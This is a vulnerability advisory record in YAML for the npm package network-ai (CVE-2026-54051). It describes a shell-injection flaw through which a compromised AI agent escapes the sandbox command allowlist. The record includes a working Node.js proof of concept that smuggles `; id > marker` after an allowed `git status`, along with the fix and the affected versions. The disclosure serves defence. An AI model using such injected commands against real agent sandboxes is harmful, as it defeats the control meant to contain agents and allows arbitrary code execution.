@@ -1,0 +1,268 @@
+advisory_id: GHSA-qw6v-5fcf-5666
+datasource_id: github_osv/GHSA-qw6v-5fcf-5666
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-qw6v-5fcf-5666/GHSA-qw6v-5fcf-5666.json
+aliases:
+  - CVE-2026-54051
+summary: |
+  Network-AI: Improper Neutralization of Special Elements used in an OS Command
+  ## Summary
+
+  The agent sandbox gates shell commands behind an allowlist (`SandboxPolicy.isCommandAllowed`), which THREAT_MODEL.md calls the main control against a compromised agent (Adversary 3.2). The allowlist glob-matches the whole command string, but `ShellExecutor` runs that string through `/bin/sh -c`. So any wildcard allow such as `git *`, `npm *` or `node *` also matches `git status; <anything>`, and a scoped command becomes arbitrary execution.
+
+  ## Root cause
+
+  Matching and execution disagree on what a command is. Lines pinned to `40e42d7` (`lib/agent-runtime.ts` is identical to the v5.8.5 tag).
+
+  1. `isCommandAllowed` matches the full string, with no tokenizing and no metacharacter check:
+
+  https://github.com/Jovancoding/Network-AI/blob/40e42d7a0a966b948953b3c524cf15355d20ef5e/lib/agent-runtime.ts#L248-L260
+
+  2. `globMatch` compiles `*` to `.*` and anchors it, so `git *` becomes `^git .*$` and matches `git status; id`:
+
+  https://github.com/Jovancoding/Network-AI/blob/40e42d7a0a966b948953b3c524cf15355d20ef5e/lib/agent-runtime.ts#L353-L360
+
+  3. `ShellExecutor.execute` only checks `isCommandAllowed`, never `requiresApproval`:
+
+  https://github.com/Jovancoding/Network-AI/blob/40e42d7a0a966b948953b3c524cf15355d20ef5e/lib/agent-runtime.ts#L387-L391
+
+  4. `spawnCommand` runs the approved string via `/bin/sh -c`, so `;`, `|` and `$(...)` are interpreted by the shell:
+
+  https://github.com/Jovancoding/Network-AI/blob/40e42d7a0a966b948953b3c524cf15355d20ef5e/lib/agent-runtime.ts#L427-L431
+
+  ## Reachability
+
+  Any agent or caller allowed to run commands hits this when the operator allowlist has a wildcard entry. A plain `git *` is enough. No fresh-install precondition and no extra misconfiguration.
+
+  ## PoC
+
+  Installs `network-ai@5.8.5`, allows `git *`, then runs `git status; id > marker`.
+  The allowlist accepts it and the injected `id` runs.
+
+  Run: `npm i network-ai@5.8.5 && node poc-316.js`
+
+  ```js
+  'use strict';
+  const os = require('os');
+  const fs = require('fs');
+  const path = require('path');
+  const { SandboxPolicy, ShellExecutor } = require('network-ai');
+
+  (async () => {
+    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'nai-poc-316-'));
+    const marker = path.join(base, 'PWNED-316.txt');
+    const policy = new SandboxPolicy({ basePath: base, allowedCommands: ['git *'] });
+    const sh = new ShellExecutor(policy);
+
+    const payload = `git status; id > ${marker}; echo INJECTED`;
+    console.log('version:', require('network-ai/package.json').version);
+    console.log('allowed:', policy.isCommandAllowed(payload));
+
+    await sh.execute(payload);
+    const ran = fs.existsSync(marker);
+    console.log('injected id ran:', ran, ran ? fs.readFileSync(marker, 'utf8').trim() : '');
+    console.log(ran ? 'VULNERABLE' : 'not reproduced');
+    process.exit(ran ? 0 : 1);
+  })().catch(err => { console.error(err); process.exit(3); });
+  ```
+
+  Output:
+
+  ```
+  version: 5.8.5
+  allowed: true
+  injected id ran: true uid=501(alex) gid=20(staff) groups=20(staff),...
+  VULNERABLE
+  ```
+
+  ## Impact
+
+  Arbitrary command execution as the orchestrator process. It defeats the one control meant to contain a compromised agent, so any agent with a single wildcard allow (`git *`, `npm *`, `node *`) can run anything. `node *` and `npm *` are direct code exec even without metacharacters.
+
+  ## Possible fix
+
+  Do not run agent commands through a shell. Parse to argv and `spawn(file, args, { shell: false })`, allowlist on the executable plus argument patterns, and reject shell metacharacters. Anchoring the regex alone is not enough; the whole-string match plus `/bin/sh -c` is the bug.
+
+
+  ## Patch
+
+  Fixed in **v5.9.1** (commit `379f776`). `ShellExecutor` now executes via `spawn(file, args, { shell: false })` using a quote-aware parsed argv, so no shell is invoked. `SandboxPolicy.isCommandAllowed` and the new `SandboxPolicy.tokenizeCommand` reject any unquoted shell metacharacter (`; & | $ ` ` ` ( ) < > { }` newline) or unterminated quote **before** the allowlist glob match; quoted metacharacters are preserved as literal argument data.
+
+  **Remediation:** upgrade to `network-ai@5.9.1` or later. As defense in depth, avoid broad wildcard allowlist entries such as `node *` / `npm *` which are direct code execution by design.
+impacted_packages:
+  - purl: pkg:npm/network-ai
+    affected_versions: vers:npm/<5.9.1
+    fixed_versions: vers:npm/5.9.1
+    affected_packages:
+      - pkg:npm/network-ai@3.0.0
+      - pkg:npm/network-ai@3.0.1
+      - pkg:npm/network-ai@3.0.2
+      - pkg:npm/network-ai@3.0.3
+      - pkg:npm/network-ai@3.1.0
+      - pkg:npm/network-ai@3.1.2
+      - pkg:npm/network-ai@3.1.3
+      - pkg:npm/network-ai@3.2.0
+      - pkg:npm/network-ai@3.2.1
+      - pkg:npm/network-ai@3.2.2
+      - pkg:npm/network-ai@3.2.3
+      - pkg:npm/network-ai@3.2.4
+      - pkg:npm/network-ai@3.2.5
+      - pkg:npm/network-ai@3.2.6
+      - pkg:npm/network-ai@3.2.7
+      - pkg:npm/network-ai@3.2.8
+      - pkg:npm/network-ai@3.2.9
+      - pkg:npm/network-ai@3.2.10
+      - pkg:npm/network-ai@3.2.11
+      - pkg:npm/network-ai@3.3.0
+      - pkg:npm/network-ai@3.3.1
+      - pkg:npm/network-ai@3.3.2
+      - pkg:npm/network-ai@3.3.3
+      - pkg:npm/network-ai@3.3.4
+      - pkg:npm/network-ai@3.3.5
+      - pkg:npm/network-ai@3.3.6
+      - pkg:npm/network-ai@3.3.7
+      - pkg:npm/network-ai@3.3.8
+      - pkg:npm/network-ai@3.3.9
+      - pkg:npm/network-ai@3.3.10
+      - pkg:npm/network-ai@3.3.11
+      - pkg:npm/network-ai@3.4.0
+      - pkg:npm/network-ai@3.4.1
+      - pkg:npm/network-ai@3.5.0
+      - pkg:npm/network-ai@3.5.1
+      - pkg:npm/network-ai@3.6.0
+      - pkg:npm/network-ai@3.6.2
+      - pkg:npm/network-ai@3.7.0
+      - pkg:npm/network-ai@3.7.1
+      - pkg:npm/network-ai@3.8.0
+      - pkg:npm/network-ai@3.9.0
+      - pkg:npm/network-ai@4.0.0
+      - pkg:npm/network-ai@4.0.1
+      - pkg:npm/network-ai@4.0.2
+      - pkg:npm/network-ai@4.0.3
+      - pkg:npm/network-ai@4.0.4
+      - pkg:npm/network-ai@4.0.5
+      - pkg:npm/network-ai@4.0.6
+      - pkg:npm/network-ai@4.0.7
+      - pkg:npm/network-ai@4.0.8
+      - pkg:npm/network-ai@4.0.9
+      - pkg:npm/network-ai@4.0.10
+      - pkg:npm/network-ai@4.0.11
+      - pkg:npm/network-ai@4.0.12
+      - pkg:npm/network-ai@4.0.13
+      - pkg:npm/network-ai@4.0.14
+      - pkg:npm/network-ai@4.0.15
+      - pkg:npm/network-ai@4.0.16
+      - pkg:npm/network-ai@4.0.17
+      - pkg:npm/network-ai@4.1.0
+      - pkg:npm/network-ai@4.2.0
+      - pkg:npm/network-ai@4.3.0
+      - pkg:npm/network-ai@4.3.1
+      - pkg:npm/network-ai@4.3.2
+      - pkg:npm/network-ai@4.3.3
+      - pkg:npm/network-ai@4.3.4
+      - pkg:npm/network-ai@4.3.5
+      - pkg:npm/network-ai@4.3.6
+      - pkg:npm/network-ai@4.3.7
+      - pkg:npm/network-ai@4.4.0
+      - pkg:npm/network-ai@4.4.1
+      - pkg:npm/network-ai@4.4.2
+      - pkg:npm/network-ai@4.4.3
+      - pkg:npm/network-ai@4.5.0
+      - pkg:npm/network-ai@4.5.1
+      - pkg:npm/network-ai@4.5.2
+      - pkg:npm/network-ai@4.5.3
+      - pkg:npm/network-ai@4.6.0
+      - pkg:npm/network-ai@4.6.1
+      - pkg:npm/network-ai@4.6.2
+      - pkg:npm/network-ai@4.7.0
+      - pkg:npm/network-ai@4.7.1
+      - pkg:npm/network-ai@4.8.0
+      - pkg:npm/network-ai@4.8.1
+      - pkg:npm/network-ai@4.9.0
+      - pkg:npm/network-ai@4.9.1
+      - pkg:npm/network-ai@4.10.0
+      - pkg:npm/network-ai@4.10.1
+      - pkg:npm/network-ai@4.10.2
+      - pkg:npm/network-ai@4.10.3
+      - pkg:npm/network-ai@4.10.4
+      - pkg:npm/network-ai@4.10.5
+      - pkg:npm/network-ai@4.11.0
+      - pkg:npm/network-ai@4.11.1
+      - pkg:npm/network-ai@4.11.2
+      - pkg:npm/network-ai@4.12.0
+      - pkg:npm/network-ai@4.12.1
+      - pkg:npm/network-ai@4.13.0
+      - pkg:npm/network-ai@4.13.1
+      - pkg:npm/network-ai@4.14.0
+      - pkg:npm/network-ai@4.15.0
+      - pkg:npm/network-ai@4.15.1
+      - pkg:npm/network-ai@4.15.2
+      - pkg:npm/network-ai@4.15.3
+      - pkg:npm/network-ai@5.0.0
+      - pkg:npm/network-ai@5.1.0
+      - pkg:npm/network-ai@5.1.1
+      - pkg:npm/network-ai@5.1.2
+      - pkg:npm/network-ai@5.1.3
+      - pkg:npm/network-ai@5.1.4
+      - pkg:npm/network-ai@5.2.0
+      - pkg:npm/network-ai@5.2.1
+      - pkg:npm/network-ai@5.2.2
+      - pkg:npm/network-ai@5.3.0
+      - pkg:npm/network-ai@5.3.1
+      - pkg:npm/network-ai@5.3.2
+      - pkg:npm/network-ai@5.4.0
+      - pkg:npm/network-ai@5.4.1
+      - pkg:npm/network-ai@5.4.2
+      - pkg:npm/network-ai@5.4.3
+      - pkg:npm/network-ai@5.4.4
+      - pkg:npm/network-ai@5.4.5
+      - pkg:npm/network-ai@5.5.0
+      - pkg:npm/network-ai@5.5.1
+      - pkg:npm/network-ai@5.5.2
+      - pkg:npm/network-ai@5.5.3
+      - pkg:npm/network-ai@5.5.4
+      - pkg:npm/network-ai@5.5.5
+      - pkg:npm/network-ai@5.5.6
+      - pkg:npm/network-ai@5.5.7
+      - pkg:npm/network-ai@5.5.8
+      - pkg:npm/network-ai@5.5.9
+      - pkg:npm/network-ai@5.6.0
+      - pkg:npm/network-ai@5.6.1
+      - pkg:npm/network-ai@5.7.0
+      - pkg:npm/network-ai@5.7.1
+      - pkg:npm/network-ai@5.7.2
+      - pkg:npm/network-ai@5.8.0
+      - pkg:npm/network-ai@5.8.1
+      - pkg:npm/network-ai@5.8.2
+      - pkg:npm/network-ai@5.8.3
+      - pkg:npm/network-ai@5.8.4
+      - pkg:npm/network-ai@5.8.5
+      - pkg:npm/network-ai@5.8.6
+      - pkg:npm/network-ai@5.8.7
+      - pkg:npm/network-ai@5.8.8
+      - pkg:npm/network-ai@5.8.9
+      - pkg:npm/network-ai@5.9.0
+    fixed_packages:
+      - pkg:npm/network-ai@5.9.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.9'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-qw6v-5fcf-5666/GHSA-qw6v-5fcf-5666.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-78
+references:
+  - url: https://github.com/Jovancoding/Network-AI
+    reference_type:
+    reference_id:
+  - url: https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-qw6v-5fcf-5666
+    reference_type:
+    reference_id:
+exploits: []
